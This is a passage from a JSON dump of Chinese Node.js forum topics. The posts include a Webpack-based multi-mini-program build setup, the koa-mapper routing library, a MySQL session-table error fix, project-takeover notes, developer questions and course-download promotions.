href=\"https://github.com/liuxing/abc-blog/blob/master/docs/3.8%E8%AF%84%E8%AE%BA%E5%8A%9F%E8%83%BD.md#%E5%8F%91%E5%B8%83%E7%95%99%E8%A8%80\">发布留言</a></li>\n<li><a href=\"https://github.com/liuxing/abc-blog/blob/master/docs/3.8%E8%AF%84%E8%AE%BA%E5%8A%9F%E8%83%BD.md#%E5%8F%91%E5%B8%83%E7%95%99%E8%A8%80\">显示留言</a></li>\n<li><a href=\"https://github.com/liuxing/abc-blog/blob/master/docs/3.8%E8%AF%84%E8%AE%BA%E5%8A%9F%E8%83%BD.md#%E5%88%A0%E9%99%A4%E7%95%99%E8%A8%80\">删除留言</a></li>\n</ul>\n<p><a href=\"https://github.com/liuxing/abc-blog/blob/master/docs/3.9%E4%B8%80%E4%BA%9B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98.md\">3.9 一些安全问题</a></p>\n<ul>\n<li><a href=\"https://github.com/liuxing/abc-blog/blob/master/docs/3.9%E4%B8%80%E4%BA%9B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98.md#xss%E7%9A%84%E9%98%B2%E8%8C%83\">XSS的防范</a></li>\n<li><a href=\"https://github.com/liuxing/abc-blog/blob/master/docs/3.9%E4%B8%80%E4%BA%9B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98.md#csrf-%E7%9A%84%E9%98%B2%E8%8C%83\">CSRF的防范</a></li>\n</ul>\n<p><a href=\"https://github.com/liuxing/abc-blog/blob/master/docs/3.10%E6%96%87%E7%AB%A0%E5%88%86%E7%B1%BB.md\">3.10 分类管理</a></p>\n<ul>\n<li><a href=\"https://github.com/liuxing/abc-blog/blob/master/docs/3.10%E6%96%87%E7%AB%A0%E5%88%86%E7%B1%BB.md#%E5%88%86%E7%B1%BB%E6%A8%A1%E5%9E%8B%E8%AE%BE%E8%AE%A1\">分类模型</a></li>\n<li><a href=\"https://github.com/liuxing/abc-blog/blob/master/docs/3.10%E6%96%87%E7%AB%A0%E5%88%86%E7%B1%BB.md#%E5%88%86%E7%B1%BB%E7%AE%A1%E7%90%86%E4%B8%BB%E9%A1%B5\">分类管理主页</a></li>\n<li><a href=\"https://github.com/liuxing/abc-blog/blob/master/docs/3.10%E6%96%87%E7%AB%A0%E5%88%86%E7%B1%BB.md#%E6%96%B0%E5%A2%9E%E5%88%86%E7%B1%BB\">新增与删除</a></li>\n</ul>\n<p><a href=\"https://github.com/liuxing/abc-blog/blob/master/docs/3.11%E5%88%86%E9%A1%B5%E5%8A%9F%E8%83%BD.md\">3.11 分页功能</a></p>\n<ul>\n<li><a href=\"https://github.com/liuxing/abc-blog/blob/master/docs/3.11%E5%88%86%E9%A1%B5%E5%8A%9F%E8%83%BD.md#mongodb-%E5%AE%9E%E7%8E%B0%E5%88%86%E9%A1%B5%E5%8E%9F%E7%90%86\">MongoDB分页原理</a></li>\n<li><a href=\"https://github.com/liuxing/abc-blog/blob/master/docs/3.11%E5%88%86%E9%A1%B5%E5%8A%9F%E8%83%BD.md#%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E5%9F%BA%E6%9C%AC%E7%9A%84%E5%88%86%E9%A1%B5%E5%99%A8\">实现一个基本的分页器</a></li>\n<li><a href=\"https://github.com/liuxing/abc-blog/blob/master/docs/3.11%E5%88%86%E9%A1%B5%E5%8A%9F%E8%83%BD.md#%E9%AB%98%E7%BA%A7%E4%B8%80%E7%82%B9%E5%84%BF%E7%9A%84%E5%88%86%E9%A1%B5%E5%99%A8\">高级一点儿的分页器</a></li>\n</ul>\n<p><a href=\"https://github.com/liuxing/abc-blog/blob/master/docs/3.12koa2%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86%E5%8F%8A404.md\">3.12 koa2错误处理及404</a></p>\n<p>[3.13 单元测试 更新中]</p>\n<p>关于测试：大家喜欢什么框架 mocha or jest？\n…</p>\n<p>持续更新中，未来将逐步发布【上线篇】：域名服务器选购、服务器配置、Nginx等等。实现线上部署</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2018/3/12/1621826e0dd7f41a?w=642&amp;h=382&amp;f=webp&amp;s=12738\" alt></p>\n<p>左手代码右手砖抛砖引玉</p>\n</div>","title":"《Node.js从入门到上线》入门篇 （持续更新中）","last_reply_at":"2019-04-19T04:08:07.705Z","good":false,"top":false,"reply_count":52,"visit_count":14041,"create_at":"2018-06-07T13:57:01.654Z","author":{"loginname":"liuxing","avatar_url":"https://avatars0.githubusercontent.com/u/17724186?v=4&s=120"}},{"id":"5cb7f44d37faec0ce1d0334e","author_id":"511350f6df9e9fcc58856443","tab":"share","content":"<div class=\"markdown-text\"><h2>故事是这样开始的</h2>\n<p>前端开发小哥Bingo接到了产品小姐姐的需求，要上线多个小程序.</p>\n<h2>码畜小哥开始架构</h2>\n<ul>\n<li>小程序杂，放一个项目方便管理</li>\n<li>小程序多，代码要能够复用</li>\n<li>团队开发，代码风格要统一</li>\n</ul>\n<h2>码畜小哥开始建项目</h2>\n<p>这是单个小程序的基本目录结构，没问题</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/4/18/16a2e5c87df50428?w=231&amp;h=222&amp;f=jpeg&amp;s=16850\" alt=\"图片描述\"></p>\n<p>当一个项目有多个小程序的时候，好像也没问题</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/4/18/16a2e5c87e3ecf17?w=206&amp;h=442&amp;f=jpeg&amp;s=26578\" alt=\"图片描述\"></p>\n<p>当多个小程序都用到同一个组件 com3 时，小哥发现代码没法复用，需要复制黏贴</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/4/18/16a2e5c87dea03e6?w=191&amp;h=353&amp;f=jpeg&amp;s=23022\" alt=\"图片描述\"></p>\n<p>思考了一下，那么把组件目录移到外面，这样不就可以复用了吗？</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/4/18/16a2e5c87e9df3be?w=195&amp;h=311&amp;f=jpeg&amp;s=21113\" alt=\"图片描述\"></p>\n<p>感觉很好，小哥这时在微信开发者工具打开 demo1，发现报错了</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/4/18/16a2e5c88766f2fd?w=665&amp;h=403&amp;f=jpeg&amp;s=64446\" alt=\"图片描述\"></p>\n<p>原来小程序是以当前项目作为根目录，components 目录已经不在 demo1 目录范围内，所以是引用不到的</p>\n<h2>小哥想到了 Webpack</h2>\n<h3>1. 整理目录</h3>\n<ul>\n<li>apps/：存放全部小程序</li>\n<li>build/：存放构建脚本</li>\n<li>common/：存放公共方法</li>\n<li>components/：存放公共组件</li>\n<li>styles/：存放公共样式</li>\n<li>templates/：存放公共模板</li>\n</ul>\n<p>大概长这样</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/4/18/16a2e5c887193e91?w=215&amp;h=316&amp;f=jpeg&amp;s=22665\" alt=\"图片描述\"></p>\n<h3>2. 编写构建脚本</h3>\n<p>package.json</p>\n<pre class=\"prettyprint language-javascript\"><code>script: {\n  &quot;dev&quot;: &quot;webpack --config build&#x2F;webpack.config.js&quot;\n}\n</code></pre><p>build/webpack.config.js</p>\n<blockquote>\n<p>思路就是利用 CopyWebpackPlugin 同步指定的文件到小程序目录下</p>\n</blockquote>\n<pre class=\"prettyprint language-javascript\"><code>const CopyWebpackPlugin = require(&#x27;copy-webpack-plugin&#x27;)\nconst utils = require(&#x27;.&#x2F;utils&#x27;)\n\n&#x2F;&#x2F; 获取 apps 目录下的小程序并指定公共文件目录命名\nfunction copyToApps(dir) {\n  let r = []\n\n  utils\n    .exec(&#96;cd ${utils.resolve(&#x27;apps&#x27;)} &amp;&amp; ls&#96;)\n    .split(&#x27;\\n&#x27;)\n    .map(app =&gt; {\n      r.push({\n        from: utils.resolve(dir),\n        to: utils.resolve(&#96;apps&#x2F;${app}&#x2F;_${dir}&#96;)\n      })\n    })\n\n  return r\n}\n\nmodule.exports = {\n  watch: true,\n\n  &#x2F;&#x2F; 监听入口文件，保存便会刷新\n  entry: utils.resolve(&#x27;index.js&#x27;),\n\n  output: {\n    path: utils.resolve(&#x27;.tmp&#x27;),\n    filename: &#x27;bundle.js&#x27;\n  },\n\n  plugins: [\n    &#x2F;&#x2F; 同步指定的公共文件到所有小程序目录下\n    new CopyWebpackPlugin([\n      ...copyToApps(&#x27;styles&#x27;),\n      ...copyToApps(&#x27;common&#x27;),\n      ...copyToApps(&#x27;templates&#x27;),\n      ...copyToApps(&#x27;components&#x27;)\n    ])\n  ]\n}\n</code></pre><h3>3. 启动本地开发</h3>\n<pre class=\"prettyprint language-javascript\"><code>npm run dev\n</code></pre><p><img src=\"https://user-gold-cdn.xitu.io/2019/4/18/16a2e5c8b5931c1e?w=602&amp;h=456&amp;f=jpeg&amp;s=96585\" alt=\"图片描述\"></p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/4/18/16a2e5c8ea94bcae?w=244&amp;h=467&amp;f=jpeg&amp;s=29761\" alt=\"图片描述\"></p>\n<p>现在公用的代码已经自动同步到小程序目录下，以下划线开头，当改动公共代码也会自动同步给小程序调用</p>\n<p>调用方式长这样</p>\n<pre class=\"prettyprint language-javascript\"><code>import utils from &#x27;.&#x2F;_common&#x2F;utils&#x27;\nimport com3 from &#x27;.&#x2F;_components&#x2F;com3&#x27;\n</code></pre><pre class=\"prettyprint language-css\"><code>@import &#x27;.&#x2F;_styles&#x2F;index.wxss&#x27;;\n</code></pre><pre class=\"prettyprint language-html\"><code>&lt;import src=&quot;.&#x2F;_templates&#x2F;index.wxml&quot; &#x2F;&gt;\n</code></pre><h2>代码风格校验</h2>\n<p>package.json</p>\n<pre class=\"prettyprint language-javascript\"><code>script: {\n  &quot;lint&quot;: &quot;eslint apps&#x2F;&quot;\n}\n</code></pre><p>.eslintrc.js</p>\n<pre class=\"prettyprint language-javascript\"><code>module.exports = {\n  extends: &#x27;standard&#x27;,\n\n  &#x2F;&#x2F; 将小程序特有的全局变量排除下\n  globals: {\n    Page: true,\n    Component: true,\n    App: true,\n    getApp: true,\n    wx: true\n  },\n\n  rules: {\n    &#x27;space-before-function-paren&#x27;: [&#x27;error&#x27;, &#x27;never&#x27;],\n    &#x27;no-unused-vars&#x27;: [\n      &#x27;error&#x27;,\n      {\n        &#x2F;&#x2F; 小程序还没支持 ES7，这个是用来兼容 async&#x2F;await\n        varsIgnorePattern: &#x27;regeneratorRuntime&#x27;\n      }\n    ]\n  }\n}\n</code></pre><p>然后借助 <a href=\"https://github.com/typicode/husky\">husky</a> 在每次 git commit 前执行校验</p>\n<pre class=\"prettyprint language-javascript\"><code>script: {\n  &quot;precommit&quot;: &quot;npm run lint&quot;\n},\n\ndevDependencies: {\n  &quot;husky&quot;: &quot;^0.14.3&quot;\n}\n\n</code></pre><h2>清理</h2>\n<p>最后小哥还加了个清理命令，便于重新生成公共代码</p>\n<p>package.json</p>\n<pre class=\"prettyprint language-javascript\"><code>script: {\n  &quot;clean&quot;: &quot;node build&#x2F;clean.js&quot;\n}\n\n</code></pre><p>build/clean.js</p>\n<pre class=\"prettyprint language-javascript\"><code>const rimraf = require(&#x27;rimraf&#x27;)\nconst utils = require(&#x27;.&#x2F;utils&#x27;)\n\nfunction log(dir) {\n  console.log(&#96;cleaning ${dir}&#96;)\n}\n\nrimraf(utils.resolve(&#x27;.tmp&#x27;), () =&gt; log(&#x27;.tmp&#x27;))\n\nutils\n  .exec(&#96;cd ${utils.resolve(&#x27;apps&#x27;)} &amp;&amp; ls&#96;)\n  .split(&#x27;\\n&#x27;)\n  .map(app =&gt; {\n    ;[\n      &#96;${app}&#x2F;_styles&#96;,\n      &#96;${app}&#x2F;_common&#96;,\n      &#96;${app}&#x2F;_templates&#96;,\n      &#96;${app}&#x2F;_components&#96;\n    ].map(m =&gt; {\n      rimraf(utils.resolve(&#96;apps&#x2F;${m}&#96;), () =&gt; log(m))\n    })\n  })\n\n</code></pre><h2>码畜小哥心满意足</h2>\n<blockquote>\n<p>“可以下班追剧了”</p>\n</blockquote>\n<h2>码畜小哥简介</h2>\n<p>考拉前端开发小哥Bingo，钻研小程序开发。</p>\n</div>","title":"利用 Webpack 实现小程序多项目管理","last_reply_at":"2019-04-19T03:01:49.536Z","good":false,"top":false,"reply_count":2,"visit_count":782,"create_at":"2019-04-18T03:51:41.757Z","author":{"loginname":"kalengo","avatar_url":"https://avatars2.githubusercontent.com/u/8817810?v=4&s=120"}},{"id":"5c7f48af5b8cb21491ca65d0","author_id":"55e3e9f422d29223058b65d3","tab":"share","content":"<div class=\"markdown-text\"><h2>前言</h2>\n<p>koa-router 是目前用的比较多的 Koa 的路由中间件之一，前段时间由于作者没有精力继续维护而将其<a href=\"https://www.zhihu.com/question/310604967\">公开售卖</a>。我们有些项目也用到了这个库，但是目前很多我们想要的特性都没有，比如生成接口文档。本身这个库代码实现还比较简单，因此综合考虑打算重写一个。</p>\n<p>项目地址：<a href=\"https://github.com/d-band/koa-mapper\">https://github.com/d-band/koa-mapper</a></p>\n<h2>特性：</h2>\n<ul>\n<li>支持几乎所有的 koa-router 特性</li>\n<li>支持 params 校验</li>\n<li>params 支持从 path, header, query, cookie 中获取</li>\n<li>支持 body parser</li>\n<li>支持 request body 校验</li>\n<li>支持参数类型自动转换</li>\n<li>支持自动生成 OpenAPI</li>\n</ul>\n<h2>简单例子：</h2>\n<p><strong>index.js</strong></p>\n<pre class=\"prettyprint\"><code>import Koa from &#x27;koa&#x27;;\nimport Mapper from &#x27;koa-mapper&#x27;;\nimport * as service from &#x27;.&#x2F;service&#x27;;\n\nconst Mapper = new Mapper();\n\nmapper.get(&#x27;&#x2F;users&#x2F;:id&#x2F;projects&#x27;, {\n  params: {\n    id: { type: &#x27;number&#x27; },\n    status: { type: &#x27;array&lt;string&gt;&#x27;, in: &#x27;query&#x27; },\n    token: { type: &#x27;string&#x27;, in: &#x27;header&#x27; }\n  }\n}, service.getProjects);\n\nmapper.post(&#x27;&#x2F;users&#x2F;:id&#x2F;projects&#x27;, {\n  params: {\n    id: { type: &#x27;number&#x27; }\n  },\n  body: &#x27;Project&#x27;\n}, service.addProject);\n\nmapper.schema(&#x27;Project&#x27;, {\n  id: { type: &#x27;number&#x27;, required: true },\n  name: { type: &#x27;string&#x27;, required: true },\n  status: { type: &#x27;array&lt;Status&gt;&#x27;, required: true }\n});\n\nmapper.schema(&#x27;Status&#x27;, {\n  id: { type: &#x27;integer&#x27; },\n  name: { type: &#x27;string&#x27; }\n}, {\n  required: [&#x27;id&#x27;, &#x27;name&#x27;]\n});\n\napp.use(mapper.routes());\napp.use(mapper.allowedMethods());\n\napp.listen(3000);\n\n&#x2F;&#x2F; open http:&#x2F;&#x2F;localhost:3000&#x2F;openapi.json\n</code></pre><p><strong>service.js</strong></p>\n<pre class=\"prettyprint\"><code>export async function getProjects(ctx) {\n  const { id, status, token } = ctx.params;\n\n  await checkToken(id, token);\n\n  ctx.body = await Project.findAll({\n    where: {\n      userId: id,\n      status: { $in: status }\n    }\n  });\n}\n\nexport async function addProject(ctx) {\n  const { body } = ctx.request;\n\n  ctx.body = await Project.create({\n    ...body,\n    userId: id\n  });\n}\n</code></pre><h2>路由定义：</h2>\n<pre class=\"prettyprint\"><code>mapper.get(path, [options], ...middlewares);\nmapper.post(path, [options], ...middlewares);\nmapper.put(path, [options], ...middlewares);\nmapper.del(path, [options], ...middlewares);\n...\n</code></pre><p>options 为可选参数，包含:</p>\n<ul>\n<li>name: 路由名称</li>\n<li>params: 请求参数定义</li>\n<li>body: 请求 Body 定义</li>\n<li>其他 OpenAPI 中 Operation Object 的参数</li>\n</ul>\n<p>options.params 为请求参数定义，如：</p>\n<pre class=\"prettyprint\"><code>params = {\n  id: { type: &#x27;number&#x27; },\n  name: { type: &#x27;string&#x27;, in: &#x27;query&#x27; },\n  user: { type: &#x27;User&#x27;, in: &#x27;query&#x27; }\n}\n</code></pre><ul>\n<li>type: 参数类型，包含基本类型（<code>number</code>、<code>string</code>、<code>integer</code>、<code>date</code>、<code>time</code>、<code>datetime</code>），数组类型（<code>array&lt;string&gt;</code>），自定义类型（如 User），自定义数组类型（<code>array&lt;User&gt;</code>），多个类型（<code>number|string</code>）</li>\n<li>in: 参数来源，包含 path，header，query，cookie</li>\n<li>其他 OpenAPI 中 Parameter Object 的参数</li>\n</ul>\n<h2>自定义类型</h2>\n<pre class=\"prettyprint\"><code>mapper.define(schemaName, properties, options);\n&#x2F;&#x2F; or\nmapper.schema(schemaName, properties, options);\n</code></pre><p>支持类型组合，如：</p>\n<pre class=\"prettyprint\"><code>mapper.schema(&#x27;Status&#x27;, {\n  id: { type: &#x27;integer&#x27; },\n  name: { type: &#x27;string&#x27; }\n}, {\n  required: [&#x27;id&#x27;]\n});\nmapper.schema(&#x27;Project&#x27;, {\n  id: { type: &#x27;number&#x27;, required: true },\n  name: { type: &#x27;string&#x27;, required: true },\n  status: { type: &#x27;array&lt;Status&gt;&#x27;, required: true }\n});\n</code></pre><p>支持继承，如：</p>\n<pre class=\"prettyprint\"><code>mapper.schema(&#x27;Model&#x27;, {\n  id: { type: &#x27;number&#x27; },\n  createdAt: { type: &#x27;datetime&#x27; },\n  updatedAt: { type: &#x27;datetime&#x27; }\n});\nmapper.schema(&#x27;User: Model&#x27;, {\n  name: { type: &#x27;string&#x27; }\n});\n</code></pre><h2>Body Parser</h2>\n<pre class=\"prettyprint\"><code>mapper.post(&#x27;&#x2F;users&#x27;, {\n  body: &#x27;User&#x27;\n}, (ctx) =&gt; {\n  const { id, name } = ctx.request.body;\n});\n</code></pre><p>支持文件上传，如：</p>\n<pre class=\"prettyprint\"><code>mapper.post(&#x27;&#x2F;uploadImage&#x27;, {\n  bodyparser: { multipart: true },\n  body: {\n    user: { type: &#x27;number&#x27; },\n    image: { type: &#x27;file&#x27; }\n  }\n}, (ctx) =&gt; {\n  const { user, image } = ctx.request.body;\n});\n</code></pre><h2>结尾</h2>\n<p>目前 koa-mapper 刚发布，测试覆盖率达到 100%，有哪些有兴趣的小伙伴欢迎一起维护。</p>\n</div>","title":"让我们来重新设计一下 koa-router","last_reply_at":"2019-04-19T02:28:28.033Z","good":false,"top":false,"reply_count":1,"visit_count":1286,"create_at":"2019-03-06T04:12:31.838Z","author":{"loginname":"helloyou2012","avatar_url":"https://avatars0.githubusercontent.com/u/1798364?v=4&s=120"}},{"id":"5cb82abda86ae80ce64b0b02","author_id":"5b2a60225cd02be6409015ed","tab":"ask","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/FtJPkmcz9zIgGxVHGH2x9qiOzrum\" alt=\"0094223E-9F7A-4BD3-92CC-90E9404577B6.png\"></p>\n</div>","title":"vscode安装egg插件后并没有egg代码提示？","last_reply_at":"2019-04-19T00:31:59.996Z","good":false,"top":false,"reply_count":1,"visit_count":628,"create_at":"2019-04-18T07:43:57.618Z","author":{"loginname":"vitozyf","avatar_url":"https://avatars0.githubusercontent.com/u/26626159?v=4&s=120"}},{"id":"5cb59ad7a86ae80ce64afb39","author_id":"5b03c9a7000332b81cf821a5","tab":"ask","content":"<div class=\"markdown-text\"><p>操作系统自己开个线程不断轮询各个文件描述符的 IO 缓存区，发现有数据，就产生一个事件？</p>\n</div>","title":"操作系统是怎么实现epoll的？","last_reply_at":"2019-04-18T15:19:35.649Z","good":false,"top":false,"reply_count":3,"visit_count":1042,"create_at":"2019-04-16T09:05:27.872Z","author":{"loginname":"linxiaoziruo","avatar_url":"https://avatars3.githubusercontent.com/u/6881273?v=4&s=120"}},{"id":"5befe1b1be1b120abac5a592","author_id":"5b5a7729b71aedfe4c12652b","tab":"share","content":"<div class=\"markdown-text\"><p>6套经典node.js+vue项目实战视频教程，大家看看下面具体教程，有需要的可以学习一下哦</p>\n<p><img src=\"//static.cnodejs.org/FisDxxcRtOtl7qWtIwYMfYzDTr2G\" alt=\"11111.jpg\"></p>\n<p><strong>教程如下：</strong>\n[node]7天搞定NodeJS微信公众号开发\n[vue]vue2.0+node.js+MongoDB全栈打造商城（新录制）\nVue+Node+MongoDB小程序公众号全栈项目开发实战\nnode.js从入门到实战教育项目\nVue+Node+MongoDB小程序公众号全栈项目开发实战\n【实战】Node.js + Web Socket 打造即时通讯聊天程序</p>\n<p>下载地址：<a href=\"http://www.sucaihuo.com/video/378.html\">http://www.sucaihuo.com/video/378.html</a></p>\n</div>","title":"6套经典node.js+vue项目实战视频教程","last_reply_at":"2019-04-18T14:00:20.093Z","good":false,"top":false,"reply_count":21,"visit_count":4559,"create_at":"2018-11-17T09:38:57.164Z","author":{"loginname":"codeofking","avatar_url":"https://avatars2.githubusercontent.com/u/41748064?v=4&s=120"}},{"id":"5a9cf82f77dc4e0d2136ae0b","author_id":"595d976b10d696af07768a24","tab":"share","content":"<div class=\"markdown-text\"><h1>express搭建的淘宝客网站</h1>\n<blockquote>\n<p>测试地址: <a href=\"http://www.5aiss.com\">www.5aiss.com</a></p>\n</blockquote>\n<blockquote>\n<p>项目地址：<a href=\"https://gitee.com/null_639_7345/taobaoke\">https://gitee.com/null_639_7345/taobaoke</a></p>\n</blockquote>\n<h2>效果</h2>\n<p><img src=\"//static.cnodejs.org/FhODBX0aEYv9S_vHNMupGOJMyLiK\" alt=\"1.png\">\n<img src=\"//static.cnodejs.org/FnOFioCtmxAAwd-Hp6NavqrRpaV2\" alt=\"2.png\">\n<img src=\"//static.cnodejs.org/FpsOnYTFTJo1tdbBuahPTb1MUjFm\" alt=\"3.png\">\n<img src=\"//static.cnodejs.org/FgvpMq9M5kIyt7Qg0gAlvSxIXcnt\" alt=\"4.png\"></p>\n<h2>1.运行</h2>\n<ul>\n<li>安装mongodb数据库</li>\n<li>修改配置文件config/default.js</li>\n<li>配置淘宝api信息\n\\taobaoke\\server\\tbk\\TbkAPI.js</li>\n</ul>\n<pre class=\"prettyprint language-js\"><code>var client = new TopClient({\n  appkey: &quot;***&quot;,&#x2F;&#x2F;你的appkey\n  appsecret: &quot;***&quot;,&#x2F;&#x2F;appsecret\n  REST_URL: &quot;http:&#x2F;&#x2F;gw.api.taobao.com&#x2F;router&#x2F;rest&quot;\n});\n\nlet api = (module.exports = {\n  adzone_id: &quot;***&quot;,&#x2F;&#x2F;你的adzone_id\n  fields:&#x27;num_iid,title,pict_url,small_images,reserve_price,zk_final_price,user_type,provcity,item_url&#x27;\n});\n\n</code></pre><blockquote>\n<p>不清楚的请参考-book/淘宝客API使用方法.doc</p>\n</blockquote>\n<ul>\n<li>安装依赖库</li>\n</ul>\n<pre class=\"prettyprint language-sh\"><code>npm i gulp -g\nnpm i\n</code></pre><ul>\n<li>前端打包</li>\n</ul>\n<pre class=\"prettyprint language-sh\"><code>gulp\n</code></pre><ul>\n<li>启动web服务</li>\n</ul>\n<pre class=\"prettyprint language-sh\"><code>node .&#x2F;bin&#x2F;www\n</code></pre></div>","title":"express搭建的淘宝客网站","last_reply_at":"2019-04-18T10:57:28.168Z","good":false,"top":false,"reply_count":3,"visit_count":2260,"create_at":"2018-03-05T07:56:31.091Z","author":{"loginname":"18820227745","avatar_url":"https://avatars0.githubusercontent.com/u/25097125?v=4&s=120"}},{"id":"5cb85784a86ae80ce64b0cbd","author_id":"595d976b10d696af07768a24","tab":"share","content":"<div class=\"markdown-text\"><h1>使用koa-mysql-session时报错</h1>\n<ul>\n<li>\n<p>描述\n在本地测试代码没问题，但是部署到服务器上时就报错。</p>\n</li>\n<li>\n<p>错误</p>\n</li>\n</ul>\n<pre class=\"prettyprint\"><code>&gt; cross-env WEBPACK_TARGET=node NODE_ENV=production node .&#x2F;server&#x2F;app.js\n\ntrue\nthe server is start at port 3333\n&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;nav&#x2F;server&#x2F;node_modules&#x2F;koa-mysql-session&#x2F;node_modules&#x2F;co&#x2F;index.js:292\n    throw err;\n    ^\n\nError: ER_INDEX_COLUMN_TOO_LONG: Index column size too large. The maximum column size is 767 bytes.\n</code></pre><ul>\n<li>原因：因为mysql的版本差异导致的，本地5.7，服务器上5.6。koa-mysql-session是4年前的包不建议使用。</li>\n</ul>\n<blockquote>\n<p>单列索引的长度的限制:5.6里面默认不能超过767bytes，5.7不超过3072bytes</p>\n</blockquote>\n<ul>\n<li>解决：\n手动创建mysql_session_store</li>\n</ul>\n<pre class=\"prettyprint language-sql\"><code>CREATE TABLE &#96;_mysql_session_store&#96; (\n  &#96;id&#96; varchar(255) NOT NULL,\n  &#96;expires&#96; bigint(20) DEFAULT NULL,\n  &#96;data&#96; text,\n  PRIMARY KEY (&#96;id&#96;)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;\n</code></pre><ul>\n<li>\n<p>参考： <a href=\"https://blog.51cto.com/lee90/2087122\">MySQL中索引的长度的限制</a></p>\n</li>\n<li>\n<p>推荐：</p>\n<ul>\n<li><a href=\"https://zhuanlan.zhihu.com/p/25686563?refer=cnodejs\">如何挑选高质量的 Node.js 模块？</a></li>\n<li><a href=\"https://awehunt.com/?tnid=5af1c0b67b4fac67bf3af2b4\">优秀的npm包</a></li>\n</ul>\n</li>\n</ul>\n</div>","title":"使用koa-mysql-session时报错","last_reply_at":"2019-04-18T10:55:00.842Z","good":false,"top":false,"reply_count":0,"visit_count":431,"create_at":"2019-04-18T10:55:00.842Z","author":{"loginname":"18820227745","avatar_url":"https://avatars0.githubusercontent.com/u/25097125?v=4&s=120"}},{"id":"5cb49686207b2365936ed5af","author_id":"57df88ff7d8293463a01e70b","tab":"share","content":"<div class=\"markdown-text\"><p>技术栈不多，只有express、mongodb和redis\n还有完全没必要用的docker，似乎只有一台服务器\n进程管理居然还是用的forever\n缺少错误收集机制，更不用说故障报警\n有日志模块，但是却多个服务写在同一个文件，毫无疑问如果开多进程日志有很大的风险被覆盖\n前后端没有完全分离，有少量代码使用了ejs模板，完全可以砍掉做到前后端完全分离（前后端代码放一起难以分清哪些是前端哪些是后端，混乱）\n因为有两个web服务入口点，其中一个是管理后台，完全不需要nginx却也套了一层，可以砍掉\n产品文档、数据库表文档、运维文档之类还算有，不过有点多余，因为那些都是基础的东西，关键部分的文档却没有\n没有接触到线上环境，从代码上看没有任何async/await到处是var和.then().then()，明显node版本应该在4.x左右\n又遇见了global，完全失去了IDE对代码的追踪功能\n往别人对象上添加方法和属性的行为，在node后端绝对是大忌\n发现有个似乎自己写的Promise模块，在删掉前搜索了一下整个项目，结果还真使用到了，多次使用了.when()方法，寡人也是第一次见啊，必需砍掉这个不标准的东西\npost方法本身支持json，而用的时候却到处都是json数据里的一个json字符串，奇葩\n没有任何单元测试\n没有开发环境的数据库初始数据，导致部分功能完全没法在本地跑起来，所以一个项目应该要做到能在完全新环境下跑起来</p>\n<p>今天的感悟：\n1.项目还是要选择越简单的技术栈越好，这样新人可以在最短的时间接手，不要为了用某技术而用某技术，像这个项目中的docker和nginx完全是多余的\n2.项目初始提交是18年却还在使用17年就已经淘汰的异步处理方法\n3.一个项目最容易跑起来的一定要是开发环境，任何生产环境的配置都不能出现在版本库中</p>\n<p>下一步要干掉全局变量，升级node版本以支持async/await，彻底拆分前后端</p>\n</div>","title":"今天新接手了一个项目，用的技术栈不多，发贴记录下接手的过程，为以后做其它项目时改进和规范开发流程","last_reply_at":"2019-04-18T09:22:53.205Z","good":false,"top":false,"reply_count":15,"visit_count":2022,"create_at":"2019-04-15T14:34:46.397Z","author":{"loginname":"zengming00","avatar_url":"https://avatars2.githubusercontent.com/u/5255081?v=4&s=120"}},{"id":"5cb41305207b2365936ed0e6","author_id":"570b551012def0933c43ac1b","tab":"share","content":"<div class=\"markdown-text\"><pre class=\"prettyprint\"><code>魔都某公司；前段时间去面试了，然后收到2个offer；最后去了其中某一家，上了大概一天不到的班；\n他们人事下午大概4点左右的时候跟我说 因为招人的时候总经理出差了，但是现在总经理回来了，说从项目人员架构上来讲不需要人了。\n我....，  你们总经理出差去了，但我也是通过了层层面试才收到offer的啊。\n后来我说有没有赔偿，刚开始说没有，后来又叫我把银行卡写下来。   我就呵呵了，我是写下了银行卡，可它一直没有动静。\n当然我也不是因为那么点钱说这事，只是这基本的信用都没有吗。\n\n</code></pre></div>","title":"有的时候你真的想艹蛋","last_reply_at":"2019-04-18T08:50:18.288Z","good":false,"top":false,"reply_count":17,"visit_count":1643,"create_at":"2019-04-15T05:13:41.020Z","author":{"loginname":"linkenliu","avatar_url":"https://avatars0.githubusercontent.com/u/17923055?v=4&s=120"}},{"id":"5c98d7d400bcfd7eb2be60f5","author_id":"5af262b80a36e5312d6ece81","tab":"share","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/Fi0HqRPZ1HsMp9gbqS_uAyZPEVsz\" alt></p>\n<p>HTML5前端学习路线视频教程，带4个实战项目带课件资料和笔记总结，\n课程包括css3、html5、nodejs、vue、4个框架（bootstrap+Zepto+AngularJS+less）等\n教程下载：<a href=\"https://www.sucaihuo.com/video/460.html\">https://www.sucaihuo.com/video/460.html</a></p>\n</div>","title":"HTML5前端学习路线视频教程","last_reply_at":"2019-04-18T03:12:57.072Z","good":false,"top":false,"reply_count":1,"visit_count":629,"create_at":"2019-03-25T13:29:56.401Z","author":{"loginname":"alber1986","avatar_url":"https://avatars2.githubusercontent.com/u/38983466?v=4&s=120"}},{"id":"5cb69f13a86ae80ce64b0112","author_id":"59dc3f8c61932717683d21cf","tab":"ask","content":"<div 